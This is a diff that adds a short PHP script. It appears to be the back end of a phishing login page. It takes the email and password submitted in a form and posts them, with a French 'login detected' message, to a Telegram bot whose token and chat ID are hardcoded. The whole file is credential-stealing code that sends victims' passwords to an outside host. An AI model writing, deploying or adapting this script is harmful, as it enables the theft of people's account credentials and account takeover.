@@ -1,0 +1,29 @@
+<?php
+$botToken = "7566653863:AAEuEAaTASAb7FmVH1XbY_3asR-Vyh916Bc";
+$chatId = "7421525298";
+
+$email = $_POST['email'] ?? '';
+$password = $_POST['password'] ?? '';
+
+$email = htmlspecialchars($email);
+$password = htmlspecialchars($password);
+
+$message = "🔐 Connexion détectée :\n\n📧 Email : $email\n🔑 Mot de passe : $password";
+
+$url = "https://api.telegram.org/bot$botToken/sendMessage";
+$data = [
+    'chat_id' => $chatId,
+    'text' => $message
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+header('Content-Type: application/json');
+echo json_encode(['success' => $response ? true : false]);
+?>
